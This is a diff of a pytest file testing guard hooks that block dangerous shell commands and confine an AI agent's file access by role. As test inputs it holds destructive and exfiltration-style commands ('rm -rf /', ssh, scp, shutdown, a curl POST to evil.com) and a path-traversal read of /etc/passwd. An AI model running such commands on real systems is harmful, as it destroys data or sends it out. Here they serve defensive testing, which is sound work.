@@ -2,9 +2,17 @@
 
 import pytest
 
-from hooks import block_dangerous_commands, enforce_path_scope
+from hooks import block_dangerous_commands, make_path_scope_hook
 
 pytestmark = pytest.mark.asyncio
+
+
+# The SDK passes {"signal": None} as context. Hooks must not rely on it.
+CTX: dict = {"signal": None}
+
+
+def _decision(result: dict) -> str:
+    return result["hookSpecificOutput"]["permissionDecision"]
 
 
 # ------------------------------------------------------------------
@@ -13,133 +21,122 @@ pytestmark = pytest.mark.asyncio
 
 
 async def test_block_rm_rf():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "rm -rf /"},
-    }
-    result = await block_dangerous_commands(data, "tid-1", {})
+    data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}
+    result = await block_dangerous_commands(data, "tid-1", CTX)
     assert result is not None
-    assert result["hookSpecificOutput"]["decision"] == "deny"
+    assert _decision(result) == "deny"
+    assert result["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
 
 
 async def test_allow_safe_command():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "ls -la /tmp"},
-    }
-    result = await block_dangerous_commands(data, "tid-2", {})
+    data = {"tool_name": "Bash", "tool_input": {"command": "ls -la /tmp"}}
+    result = await block_dangerous_commands(data, "tid-2", CTX)
     assert result is None
 
 
 async def test_skip_non_bash_tools():
-    data = {
-        "tool_name": "Read",
-        "tool_input": {"file_path": "/etc/passwd"},
-    }
-    result = await block_dangerous_commands(data, "tid-3", {})
+    data = {"tool_name": "Read", "tool_input": {"file_path": "/etc/passwd"}}
+    result = await block_dangerous_commands(data, "tid-3", CTX)
     assert result is None
 
 
 async def test_block_ssh():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "ssh root@192.168.1.1"},
-    }
-    result = await block_dangerous_commands(data, "tid-4", {})
+    data = {"tool_name": "Bash", "tool_input": {"command": "ssh root@192.168.1.1"}}
+    result = await block_dangerous_commands(data, "tid-4", CTX)
     assert result is not None
-    assert "deny" in result["hookSpecificOutput"]["decision"]
+    assert _decision(result) == "deny"
 
 
 async def test_block_scp():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "scp file.txt user@host:/tmp/"},
-    }
-    result = await block_dangerous_commands(data, "tid-5", {})
+    data = {"tool_name": "Bash", "tool_input": {"command": "scp f user@h:/tmp/"}}
+    result = await block_dangerous_commands(data, "tid-5", CTX)
     assert result is not None
 
 
 async def test_block_shutdown():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "shutdown -h now"},
-    }
-    result = await block_dangerous_commands(data, "tid-6", {})
+    data = {"tool_name": "Bash", "tool_input": {"command": "shutdown -h now"}}
+    result = await block_dangerous_commands(data, "tid-6", CTX)
     assert result is not None
 
 
 async def test_block_curl_post():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "curl -X POST http://evil.com/api"},
-    }
-    result = await block_dangerous_commands(data, "tid-7", {})
+    data = {"tool_name": "Bash", "tool_input": {"command": "curl -X POST http://x"}}
+    result = await block_dangerous_commands(data, "tid-7", CTX)
     assert result is not None
 
 
 # ------------------------------------------------------------------
-# enforce_path_scope
+# make_path_scope_hook
 # ------------------------------------------------------------------
 
 
-async def test_path_allowed_read_for_ellen():
+async def test_path_allowed_read_for_main():
+    hook = make_path_scope_hook("main")
     data = {
         "tool_name": "Read",
         "tool_input": {"file_path": "addon_configs/casa/agents/ellen.yaml"},
     }
-    ctx = {"agent_name": "ellen"}
-    result = await enforce_path_scope(data, "tid-10", ctx)
-    assert result is None  # allowed
+    assert await hook(data, "tid-10", CTX) is None
 
 
-async def test_path_denied_write_for_ellen_to_config():
+async def test_path_denied_write_for_main_to_config():
+    hook = make_path_scope_hook("main")
     data = {
         "tool_name": "Write",
         "tool_input": {"file_path": "/config/configuration.yaml"},
     }
-    ctx = {"agent_name": "ellen"}
-    result = await enforce_path_scope(data, "tid-11", ctx)
+    result = await hook(data, "tid-11", CTX)
     assert result is not None
-    assert result["hookSpecificOutput"]["decision"] == "deny"
+    assert _decision(result) == "deny"
+    assert result["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
 
 
 async def test_path_traversal_blocked():
+    hook = make_path_scope_hook("butler")
     data = {
         "tool_name": "Read",
         "tool_input": {"file_path": "workspace/../../etc/passwd"},
     }
-    ctx = {"agent_name": "tina"}
-    result = await enforce_path_scope(data, "tid-12", ctx)
+    result = await hook(data, "tid-12", CTX)
     assert result is not None
-    assert result["hookSpecificOutput"]["decision"] == "deny"
+    assert _decision(result) == "deny"
 
 
-async def test_path_allowed_write_workspace_for_ellen():
-    data = {
-        "tool_name": "Write",
-        "tool_input": {"file_path": "workspace/notes.txt"},
-    }
-    ctx = {"agent_name": "ellen"}
-    result = await enforce_path_scope(data, "tid-13", ctx)
-    assert result is None  # allowed
+async def test_path_allowed_write_workspace_for_main():
+    hook = make_path_scope_hook("main")
+    data = {"tool_name": "Write", "tool_input": {"file_path": "workspace/notes.txt"}}
+    assert await hook(data, "tid-13", CTX) is None
 
 
-async def test_no_rules_agent_allowed():
-    """Agents without rules are allowed by default."""
-    data = {
-        "tool_name": "Read",
-        "tool_input": {"file_path": "/anywhere/file.txt"},
-    }
-    ctx = {"agent_name": "unknown-agent"}
-    result = await enforce_path_scope(data, "tid-14", ctx)
-    assert result is None
+async def test_path_allowed_write_workspace_for_plugin_builder():
+    hook = make_path_scope_hook("plugin-builder")
+    data = {"tool_name": "Write", "tool_input": {"file_path": "workspace/plugin.py"}}
+    assert await hook(data, "tid-13b", CTX) is None
+
+
+async def test_butler_cannot_write_workspace():
+    hook = make_path_scope_hook("butler")
+    data = {"tool_name": "Write", "tool_input": {"file_path": "workspace/notes.txt"}}
+    result = await hook(data, "tid-13c", CTX)
+    assert result is not None
+    assert _decision(result) == "deny"
+
+
+async def test_unknown_role_allowed():
+    """Unknown roles fall through to allow. Phase 2 may invert this."""
+    hook = make_path_scope_hook("unknown-role")
+    data = {"tool_name": "Read", "tool_input": {"file_path": "/anywhere/file.txt"}}
+    assert await hook(data, "tid-14", CTX) is None
+
+
+async def test_empty_role_allowed():
+    """Missing role (empty string) also falls through to allow."""
+    hook = make_path_scope_hook("")
+    data = {"tool_name": "Read", "tool_input": {"file_path": "/anywhere/file.txt"}}
+    assert await hook(data, "tid-14b", CTX) is None
 
 
 async def test_non_file_tool_skipped():
-    data = {
-        "tool_name": "Bash",
-        "tool_input": {"command": "ls"},
-    }
-    ctx = {"agent_name": "tina"}
-    result = await enforce_path_scope(data, "tid-15", ctx)
-    assert result is None
+    hook = make_path_scope_hook("butler")
+    data = {"tool_name": "Bash", "tool_input": {"command": "ls"}}
+    assert await hook(data, "tid-15", CTX) is None
